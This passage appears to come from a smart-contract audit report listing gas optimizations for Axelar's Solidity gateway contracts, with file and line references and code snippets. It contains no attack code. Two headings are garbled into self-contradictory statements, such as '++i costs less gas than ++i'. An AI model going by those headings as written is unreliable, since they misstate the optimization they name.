disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\n1. File: src/EternalStorage.sol (line [14](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/EternalStorage.sol#L14))\n```solidity\n    mapping(bytes32 => bool) private _boolStorage;\n```\n\n### `<array>.length` should not be looked up in every loop of a `for`-loop\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n\n1. File: src/AxelarGatewayMultisig.sol (line [118](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L118))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n2. File: src/AxelarGatewayMultisig.sol (line [271](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L271))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n\n### Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\n\n1. File: src/AxelarGateway.sol (line [81](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L81))\n```solidity\n        string memory destinationChain,\n```\n2. File: src/AxelarGateway.sol (line [82](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L82))\n```solidity\n        string memory destinationAddress,\n```\n3. File: src/AxelarGateway.sol (line [83](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L83))\n```solidity\n        string memory symbol,\n```\n4. File: src/AxelarGateway.sol (line [91](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L91))\n```solidity\n        string memory destinationChain,\n```\n5. File: src/AxelarGateway.sol (line [92](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L92))\n```solidity\n        string memory destinationContractAddress,\n```\n6. File: src/AxelarGateway.sol (line [93](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L93))\n```solidity\n        bytes memory payload\n```\n7. File: src/AxelarGateway.sol (line [99](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L99))\n```solidity\n        string memory destinationChain,\n```\n8. File: src/AxelarGateway.sol (line [100](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L100))\n```solidity\n        string memory destinationContractAddress,\n```\n9. File: src/AxelarGateway.sol (line [101](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L101))\n```solidity\n        bytes memory payload,\n```\n10. File: src/AxelarGateway.sol (line [102](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L102))\n```solidity\n        string memory symbol,\n```\n11. File: src/AxelarGateway.sol (line [119](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L119))\n```solidity\n        string memory sourceChain,\n```\n12. File: src/AxelarGateway.sol (line [120](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L120))\n```solidity\n        string memory sourceAddress,\n```\n13. File: src/AxelarGateway.sol (line [130](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L130))\n```solidity\n        string memory sourceChain,\n```\n14. File: src/AxelarGateway.sol (line [131](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L131))\n```solidity\n        string memory sourceAddress,\n```\n15. File: src/AxelarGateway.sol (line [134](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L134))\n```solidity\n        string memory symbol,\n```\n16. File: src/AxelarGateway.sol (line [153](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L153))\n```solidity\n        string memory sourceChain,\n```\n17. File: src/AxelarGateway.sol (line [154](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L154))\n```solidity\n        string memory sourceAddress,\n```\n18. File: src/AxelarGateway.sol (line [164](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L164))\n```solidity\n        string memory sourceChain,\n```\n19. File: src/AxelarGateway.sol (line [165](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L165))\n```solidity\n        string memory sourceAddress,\n```\n20. File: src/AxelarGateway.sol (line [167](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L167))\n```solidity\n        string memory symbol,\n```\n21. File: src/AxelarGateway.sol (line [234](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L234))\n```solidity\n    function freezeToken(string memory symbol) external override onlyAdmin {\n```\n22. File: src/AxelarGateway.sol (line [240](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L240))\n```solidity\n    function unfreezeToken(string memory symbol) external override onlyAdmin {\n```\n23. File: src/TokenDeployer.sol (line [9](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/TokenDeployer.sol#L9))\n```solidity\n        string memory name,\n```\n24. File: src/TokenDeployer.sol (line [10](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/TokenDeployer.sol#L10))\n```solidity\n        string memory symbol,\n```\n25. File: src/interfaces/IAxelarGateway.sol (line [81](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L81))\n```solidity\n        string memory destinationChain,\n```\n26. File: src/interfaces/IAxelarGateway.sol (line [82](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L82))\n```solidity\n        string memory destinationAddress,\n```\n27. File: src/interfaces/IAxelarGateway.sol (line [83](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L83))\n```solidity\n        string memory symbol,\n```\n28. File: src/interfaces/IAxelarGateway.sol (line [88](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L88))\n```solidity\n        string memory destinationChain,\n```\n29. File: src/interfaces/IAxelarGateway.sol (line [89](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L89))\n```solidity\n        string memory contractAddress,\n```\n30. File: src/interfaces/IAxelarGateway.sol (line [90](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L90))\n```solidity\n        bytes memory payload\n```\n31. File: src/interfaces/IAxelarGateway.sol (line [94](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L94))\n```solidity\n        string memory destinationChain,\n```\n32. File: src/interfaces/IAxelarGateway.sol (line [95](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L95))\n```solidity\n        string memory contractAddress,\n```\n33. File: src/interfaces/IAxelarGateway.sol (line [96](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L96))\n```solidity\n        bytes memory payload,\n```\n34. File: src/interfaces/IAxelarGateway.sol (line [97](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L97))\n```solidity\n        string memory symbol,\n```\n35. File: src/interfaces/IAxelarGateway.sol (line [103](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L103))\n```solidity\n        string memory sourceChain,\n```\n36. File: src/interfaces/IAxelarGateway.sol (line [104](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L104))\n```solidity\n        string memory sourceAddress,\n```\n37. File: src/interfaces/IAxelarGateway.sol (line [111](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L111))\n```solidity\n        string memory sourceChain,\n```\n38. File: src/interfaces/IAxelarGateway.sol (line [112](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L112))\n```solidity\n        string memory sourceAddress,\n```\n39. File: src/interfaces/IAxelarGateway.sol (line [115](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L115))\n```solidity\n        string memory symbol,\n```\n40. File: src/interfaces/IAxelarGateway.sol (line [121](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L121))\n```solidity\n        string memory sourceChain,\n```\n41. File: src/interfaces/IAxelarGateway.sol (line [122](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L122))\n```solidity\n        string memory sourceAddress,\n```\n42. File: src/interfaces/IAxelarGateway.sol (line [128](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L128))\n```solidity\n        string memory sourceChain,\n```\n43. File: src/interfaces/IAxelarGateway.sol (line [129](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L129))\n```solidity\n        string memory sourceAddress,\n```\n44. File: src/interfaces/IAxelarGateway.sol (line [131](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L131))\n```solidity\n        string memory symbol,\n```\n45. File: src/interfaces/IAxelarGateway.sol (line [143](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L143))\n```solidity\n    function tokenAddresses(string memory symbol) external view returns (address);\n```\n46. File: src/interfaces/IAxelarGateway.sol (line [145](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L145))\n```solidity\n    function tokenFrozen(string memory symbol) external view returns (bool);\n```\n47. File: src/interfaces/IAxelarGateway.sol (line [159](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L159))\n```solidity\n    function freezeToken(string memory symbol) external;\n```\n48. File: src/interfaces/IAxelarGateway.sol (line [161](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L161))\n```solidity\n    function unfreezeToken(string memory symbol) external;\n```\n49. File: src/interfaces/IAxelarExecutable.sol (line [18](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L18))\n```solidity\n        string memory sourceChain,\n```\n50. File: src/interfaces/IAxelarExecutable.sol (line [19](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L19))\n```solidity\n        string memory sourceAddress,\n```\n51. File: src/interfaces/IAxelarExecutable.sol (line [30](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L30))\n```solidity\n        string memory sourceChain,\n```\n52. File: src/interfaces/IAxelarExecutable.sol (line [31](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L31))\n```solidity\n        string memory sourceAddress,\n```\n53. File: src/interfaces/IAxelarExecutable.sol (line [33](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L33))\n```solidity\n        string memory tokenSymbol,\n```\n\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\n\n1. File: src/AxelarGateway.sol (line [225](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L225))\n```solidity\n        for (uint256 i; i < adminCount; i++) {\n```\n2. File: src/AdminMultisigBase.sol (line [51](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L51))\n```solidity\n        for (uint256 i; i < adminCount; i++) {\n```\n3. File: src/AdminMultisigBase.sol (line [158](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L158))\n```solidity\n        for (uint256 i; i < adminLength; i++) {\n```\n4. File: src/AxelarGatewayMultisig.sol (line [42](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L42))\n```solidity\n        for (uint256 i; i < accounts.length - 1; ++i) {\n```\n5. File: src/AxelarGatewayMultisig.sol (line [118](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L118))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n6. File: src/AxelarGatewayMultisig.sol (line [140](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L140))\n```solidity\n        for (uint256 i; i < ownerCount; i++) {\n```\n7. File: src/AxelarGatewayMultisig.sol (line [181](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L181))\n```solidity\n        for (uint256 i; i < accountLength; i++) {\n```\n8. File: src/AxelarGatewayMultisig.sol (line [271](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L271))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n9. File: src/AxelarGatewayMultisig.sol (line [293](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L293))\n```solidity\n        for (uint256 i; i < operatorCount; i++) {\n```\n10. File: src/AxelarGatewayMultisig.sol (line [332](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L332))\n```solidity\n        for (uint256 i; i < accountLength; i++) {\n```\n11. File: src/AxelarGatewayMultisig.sol (line [495](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L495))\n```solidity\n        for (uint256 i; i < signatureCount; i++) {\n```\n12. File: src/AxelarGatewayMultisig.sol (line [526](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L526))\n```solidity\n        for (uint256 i; i < commandsLength; i++) {\n```\n\n### `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)\n\n1. File: src/AxelarGateway.sol (line [225](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L225))\n```solidity\n        for (uint256 i; i < adminCount; i++) {\n```\n2. File: src/AdminMultisigBase.sol (line [51](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L51))\n```solidity\n        for (uint256 i; i < adminCount; i++) {\n```\n3. File: src/AdminMultisigBase.sol (line [158](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L158))\n```solidity\n        for (uint256 i; i < adminLength; i++) {\n```\n4. File: src/AxelarGatewayMultisig.sol (line [118](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L118))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n5. File: src/AxelarGatewayMultisig.sol (line [140](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L140))\n```solidity\n        for (uint256 i; i < ownerCount; i++) {\n```\n6. File: src/AxelarGatewayMultisig.sol (line [181](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L181))\n```solidity\n        for (uint256 i; i < accountLength; i++) {\n```\n7. File: src/AxelarGatewayMultisig.sol (line [271](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L271))\n```solidity\n        for (uint256 i; i < accounts.length; i++) {\n```\n8. File: src/AxelarGatewayMultisig.sol (line [293](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L293))\n```solidity\n        for (uint256 i; i < operatorCount; i++) {\n```\n9. File: src/AxelarGatewayMultisig.sol (line [332](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L332))\n```solidity\n        for (uint256 i; i < accountLength; i++) {\n```\n10. File: src/AxelarGatewayMultisig.sol (line [495](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L495))\n```solidity\n        for (uint256 i; i < signatureCount; i++) {\n```\n11. File: src/AxelarGatewayMultisig.sol (line [526](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L526))\n```solidity\n        for (uint256 i; i < commandsLength; i++) {\n```\n\n### Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nUse a larger size then downcast where needed\n\n1. File: src/AxelarGateway.sol (line [62](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L62))\n```solidity\n    uint8 internal constant OLD_KEY_RETENTION = 16;\n```\n2. File: src/AxelarGateway.sol (line [339](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L339))\n```solidity\n        uint8 decimals,\n```\n3. File: src/ERC20.sol (line [43](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L43))\n```solidity\n    uint8 public immutable decimals;\n```\n4. File: src/ERC20.sol (line [54](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L54))\n```solidity\n        uint8 decimals_\n```\n5. File: src/AxelarGatewayMultisig.sol (line [363](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L363))\n```solidity\n        (string memory name, string memory symbol, uint8 decimals, uint256 cap, address tokenAddr) = abi.decode(\n```\n6. File: src/BurnableMintableCappedERC20.sol (line [24](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L24))\n```solidity\n        uint8 decimals,\n```\n7. File: src/TokenDeployer.sol (line [11](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/TokenDeployer.sol#L11))\n```solidity\n        uint8 decimals,\n```\n8. File: src/ECDSA.sol (line [38](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L38))\n```solidity\n        uint8 v;\n```\n9. File: src/MintableCappedERC20.sol (line [17](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L17))\n```solidity\n        uint8 decimals,\n```\n10. File: src/ERC20Permit.sol (line [39](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L39))\n```solidity\n        uint8 v,\n```\n\n### Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`\nSee [this](https://github.com/ethereum/solidity/issues/9232) issue for a detail description of the issue\n\n1. File: src/AxelarGateway.sol (line [45](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L45))\n```solidity\n    bytes32 internal constant KEY_ALL_TOKENS_FROZEN = keccak256('all-tokens-frozen');\n```\n2. File: src/AxelarGateway.sol (line [47](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L47))\n```solidity\n    bytes32 internal constant PREFIX_COMMAND_EXECUTED = keccak256('command-executed');\n```\n3. File: src/AxelarGateway.sol (line [48](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L48))\n```solidity\n    bytes32 internal constant PREFIX_TOKEN_ADDRESS = keccak256('token-address');\n```\n4. File: src/AxelarGateway.sol (line [49](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L49))\n```solidity\n    bytes32 internal constant PREFIX_TOKEN_TYPE = keccak256('token-type');\n```\n5. File: src/AxelarGateway.sol (line [50](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L50))\n```solidity\n    bytes32 internal constant PREFIX_TOKEN_FROZEN = keccak256('token-frozen');\n```\n6. File: src/AxelarGateway.sol (line [51](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L51))\n```solidity\n    bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED = keccak256('contract-call-approved');\n```\n7. File: src/AxelarGateway.sol (line [52](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L52))\n```solidity\n    bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED_WITH_MINT = keccak256('contract-call-approved-with-mint');\n```\n8. File: src/AxelarGateway.sol (line [54](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L54))\n```solidity\n    bytes32 internal constant SELECTOR_BURN_TOKEN = keccak256('burnToken');\n```\n9. File: src/AxelarGateway.sol (line [55](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L55))\n```solidity\n    bytes32 internal constant SELECTOR_DEPLOY_TOKEN = keccak256('deployToken');\n```\n10. File: src/AxelarGateway.sol (line [56](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L56))\n```solidity\n    bytes32 internal constant SELECTOR_MINT_TOKEN = keccak256('mintToken');\n```\n11. File: src/AxelarGateway.sol (line [57](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L57))\n```solidity\n    bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL = keccak256('approveContractCall');\n```\n12. File: src/AxelarGateway.sol (line [58](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L58))\n```solidity\n    bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL_WITH_MINT = keccak256('approveContractCallWithMint');\n```\n13. File: src/AxelarGateway.sol (line [59](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L59))\n```solidity\n    bytes32 internal constant SELECTOR_TRANSFER_OPERATORSHIP = keccak256('transferOperatorship');\n```\n14. File: src/AxelarGateway.sol (line [60](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L60))\n```solidity\n    bytes32 internal constant SELECTOR_TRANSFER_OWNERSHIP = keccak256('transferOwnership');\n```\n15. File: src/AdminMultisigBase.sol (line [16](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L16))\n```solidity\n    bytes32 internal constant KEY_ADMIN_EPOCH = keccak256('admin-epoch');\n```\n16. File: src/AdminMultisigBase.sol (line [18](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L18))\n```solidity\n    bytes32 internal constant PREFIX_ADMIN = keccak256('admin');\n```\n17. File: src/AdminMultisigBase.sol (line [19](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L19))\n```solidity\n    bytes32 internal constant PREFIX_ADMIN_COUNT = keccak256('admin-count');\n```\n18. File: src/AdminMultisigBase.sol (line [20](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L20))\n```solidity\n    bytes32 internal constant PREFIX_ADMIN_THRESHOLD = keccak256('admin-threshold');\n```\n19. File: src/AdminMultisigBase.sol (line [21](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L21))\n```solidity\n    bytes32 internal constant PREFIX_ADMIN_VOTE_COUNTS = keccak256('admin-vote-counts');\n```\n20. File: src/AdminMultisigBase.sol (line [22](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L22))\n```solidity\n    bytes32 internal constant PREFIX_ADMIN_VOTED = keccak256('admin-voted');\n```\n21. File: src/AdminMultisigBase.sol (line [23](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L23))\n```solidity\n    bytes32 internal constant PREFIX_IS_ADMIN = keccak256('is-admin');\n```\n22. File: src/AxelarGatewayMultisig.sol (line [25](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L25))\n```solidity\n    bytes32 internal constant KEY_OWNER_EPOCH = keccak256('owner-epoch');\n```\n23. File: src/AxelarGatewayMultisig.sol (line [27](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L27))\n```solidity\n    bytes32 internal constant PREFIX_OWNER = keccak256('owner');\n```\n24. File: src/AxelarGatewayMultisig.sol (line [28](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L28))\n```solidity\n    bytes32 internal constant PREFIX_OWNER_COUNT = 